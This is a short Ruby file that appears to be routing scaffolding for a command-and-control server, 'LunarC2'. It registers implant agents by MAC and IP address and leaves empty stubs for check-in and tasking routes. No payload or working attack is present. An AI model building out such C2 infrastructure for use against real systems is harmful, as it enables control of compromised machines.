module Sinatra
	module LunarC2
		module Routing
			module C2
				def self.registered(app) 

					app.post '/c2/initial' do
						if not @agent = Agent.first(mac: params[:mac])
							@agent = Agent.create(mac: params[:mac], last_ip: params[:ip])
						end
						jbuilder :initial_json
					end

					app.get '/c2/checkin/:id' do

					end

					app.get '/c2/tasking/:id' do

					end

				end
			end
		end
	end
end